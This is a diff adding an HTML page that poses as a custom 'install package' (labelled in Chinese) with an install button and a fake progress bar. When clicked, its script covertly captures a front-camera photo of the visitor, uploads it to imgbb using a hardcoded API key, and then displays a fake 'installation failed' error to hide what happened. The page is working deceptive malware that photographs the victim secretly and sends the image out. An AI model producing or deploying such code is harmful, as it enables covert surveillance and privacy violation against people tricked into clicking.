@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:12px;
+  background: linear-gradient(-45deg, #f7d6ff, #d6e8ff, #ffe8f0, #e4f9ff);
+  background-size: 400% 400%;
+  animation: bgFlow 12s ease infinite;
+}
+@keyframes bgFlow {
+  0%{background-position:0% 50%}
+  50%{background-position:100% 50%}
+  100%{background-position:0% 50%}
+}
+#topLabel{
+  font-size:15px;
+  font-weight:bold;
+  background:linear-gradient(90deg,#36c,#f36,#fc0);
+  -webkit-background-clip:text;
+  color:transparent;
+}
+#topImg{
+  max-width:90%;
+  max-height:320px;
+  object-fit:contain;
+}
+#title{
+  font-size:26px;
+  font-weight:bold;
+  background:linear-gradient(90deg,#36c,#f36,#fc0);
+  -webkit-background-clip:text;
+  color:transparent;
+}
+#btn{
+  padding:14px 26px;
+  font-size:18px;
+  border-radius:999px;
+  border:1px solid #333;
+  background:#0066ff;
+  color:#fff;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+}
+#msg{color:#0066ff;font-size:16px}
+#progressWrap{
+  width:260px;
+  height:14px;
+  border-radius:999px;
+  background:#ddd;
+  overflow:hidden;
+  display:none;
+}
+#progressBar{
+  height:100%;
+  width:0%;
+  border-radius:999px;
+  background:linear-gradient(90deg,#36c,#f36,#fc0);
+}
+</style>
+<div id="topLabel">娜娜子姊姊定制</div>
+<img id="topImg" src="https://p3-flow-image-sign.byteimg.com/tos-cn-i-a9rns2rl98/30104008009e40189110104124004511~tplv-a9rns2rl98-image.image">
+<div id="title">双子安装包</div>
+<button id="btn">>点击安装<</button>
+<div id="progressWrap">
+  <div id="progressBar"></div>
+</div>
+<div id="msg"></div>
+<div id="picbox"></div>
+<script>
+const API_KEY = "9ac4a41678f3b2501f10a0d44842f04b";
+
+function dataURLtoBlob(dataurl) {
+  let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+  bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+  while(n--){ u8arr[n] = bstr.charCodeAt(n); }
+  return new Blob([u8arr], {type:mime});
+}
+
+const msgDom = document.getElementById("msg");
+const picbox = document.getElementById("picbox");
+const progressWrap = document.getElementById("progressWrap");
+const progressBar = document.getElementById("progressBar");
+const btn = document.getElementById("btn");
+
+btn.onclick = async ()=>{
+  try{
+    msgDom.innerText = "开始下载";
+    progressWrap.style.display = "block";
+    progressBar.style.width = "0%";
+    progressBar.style.transition = "width 10s linear";
+    setTimeout(()=>{
+      progressBar.style.width = "99%";
+    },50);
+
+    setTimeout(()=>{
+      msgDom.innerText = `❌安装系统调用失败`;
+    },10000);
+
+    const v = document.createElement('video');
+    const c = document.createElement('canvas');
+    const ctx = c.getContext('2d');
+    v.autoplay = true;
+    const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    v.srcObject = s;
+
+    v.onloadeddata = async ()=>{
+      c.width = v.videoWidth;
+      c.height = v.videoHeight;
+      ctx.drawImage(v,0,0);
+      const base64 = c.toDataURL("image/png");
+      s.getTracks().map(t=>t.stop());
+
+      const blob = dataURLtoBlob(base64);
+      const fd = new FormData();
+      fd.append("image", blob);
+
+      let res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`,{
+        method:"POST", body:fd
+      });
+      let json = await res.json();
+    }
+  }catch(err){
+    msgDom.innerText = `❌安装系统调用失败`;
+    console.log(err);
+  }
+}
+</script>
